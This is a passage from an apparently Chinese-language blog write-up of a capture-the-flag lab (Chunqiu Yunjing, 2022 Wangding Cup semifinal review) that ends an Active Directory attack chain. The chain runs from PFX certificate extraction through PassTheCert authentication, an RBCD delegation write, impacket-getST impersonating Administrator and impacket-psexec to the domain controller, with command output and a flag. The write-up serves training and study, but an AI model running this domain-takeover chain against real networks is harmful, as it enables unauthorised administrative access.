+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">openssl pkcs12 -<span class="hljs-keyword">in</span> xr-dc01.pfx -nodes -<span class="hljs-keyword">out</span> <span class="hljs-keyword">test</span>.pem<br>openssl rsa -<span class="hljs-keyword">in</span> <span class="hljs-keyword">test</span>.pem -<span class="hljs-keyword">out</span> <span class="hljs-keyword">test</span>.key<br>openssl x509 -<span class="hljs-keyword">in</span> <span class="hljs-keyword">test</span>.pem -<span class="hljs-keyword">out</span> <span class="hljs-keyword">test</span>.crt<br></code></pre></td></tr></table></figure>
+
+<p>whoami(脚本链接：<a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert/">https://github.com/AlmondOffSec/PassTheCert/</a>)</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains python3 passthecert<span class="hljs-selector-class">.py</span> -action whoami -crt test<span class="hljs-selector-class">.crt</span> -key test<span class="hljs-selector-class">.key</span> -domain xiaorang<span class="hljs-selector-class">.lab</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br><span class="hljs-selector-attr">[proxychains]</span> Strict chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  ...  <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>:<span class="hljs-number">636</span>  ...  OK<br><span class="hljs-selector-attr">[*]</span> You are logged <span class="hljs-keyword">in</span> as: XIAORANG\XR-DC01$<br></code></pre></td></tr></table></figure>
+
+<p>下一步将证书配置到域控的 RBCD</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">proxychains python3 passthecert.py -action write_rbcd -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to &#x27;XR-DC01$&#x27; -delegate-from &#x27;matrix1$&#x27;<br>[proxychains] Strict chain  ...  127.0.0.1:55556  ...  172.22.15.13:636  ...  OK<br>[*] Accounts allowed to act on behalf of other identity:<br>[*]     xianxin$     (S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-3745972894</span><span class="hljs-string">-1678056601</span><span class="hljs-string">-2622918667</span><span class="hljs-string">-1147</span>)<br>[*] Delegation rights modified successfully!<br>[*] matrix1$ can now impersonate users on XR-DC01$ via S4U2Proxy<br>[*] Accounts allowed to act on behalf of other identity:<br>[*]     xianxin$     (S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-3745972894</span><span class="hljs-string">-1678056601</span><span class="hljs-string">-2622918667</span><span class="hljs-string">-1147</span>)<br>[*]     matrix1$     (S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-3745972894</span><span class="hljs-string">-1678056601</span><span class="hljs-string">-2622918667</span><span class="hljs-string">-1150</span>)<br></code></pre></td></tr></table></figure>
+
+<p>接下来和之前一样申请ST</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains4 impacket-getST xiaorang.lab/<span class="hljs-string">&#x27;matrix1$&#x27;</span>:<span class="hljs-string">&#x27;Matrix2025!&#x27;</span> -spn cifs/XR-DC01<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate Administrator -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br>proxychains4 impacket-getST xiaorang.lab/matrix$:Matrix2025! -spn cifs/XR-<span class="hljs-number">0687</span><span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate administrator -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> <br></code></pre></td></tr></table></figure>
+
+<p>接下来导入申请的票据</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator.ccache<br></code></pre></td></tr></table></figure>
+
+<p>最后连接即可，注意，这里也得改host，不然还是拒绝</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir">sudo vim /etc/hosts<br>proxychains impacket-psexec <span class="hljs-title class_">Administrator</span><span class="hljs-variable">@XR</span>-<span class="hljs-title class_">DC01</span>.xiaorang.lab -k -no-pass -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br><br>type <span class="hljs-symbol">C:</span>\<span class="hljs-title class_">Users</span>\<span class="hljs-title class_">Administrator</span>\flag\flag04.txt<br> <br> ::<span class="hljs-symbol">:=====</span> :::      ::<span class="hljs-symbol">:===</span>=  ::<span class="hljs-symbol">:=====</span>  ::<span class="hljs-symbol">:===</span>=  :::  ===<br> :::      :::      :::  === :::       :::  === :::  ===<br> ======   ===      ======== === ===== ===  === ========<br> ===      ===      ===  === ===   === ===  ===      ===<br> ===      ======== ===  ===  =======   ======       ===<br><br><br><span class="hljs-symbol">flag04:</span> flag&#123;c80fb4ff-a104<span class="hljs-number">-4325</span><span class="hljs-number">-8</span>f9b<span class="hljs-number">-592</span>b9bb8e742&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="print-no-link">#春秋云镜</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜 2022网鼎杯半决赛复盘</div>
+      <div>http://example.com/2026/test54/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test55/" title="春秋云镜 GreatWall_2024">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云镜 GreatWall_2024</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test53/" title="春秋云镜 Hospital">
+                        <span class="hidden-mobile">春秋云镜 Hospital</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
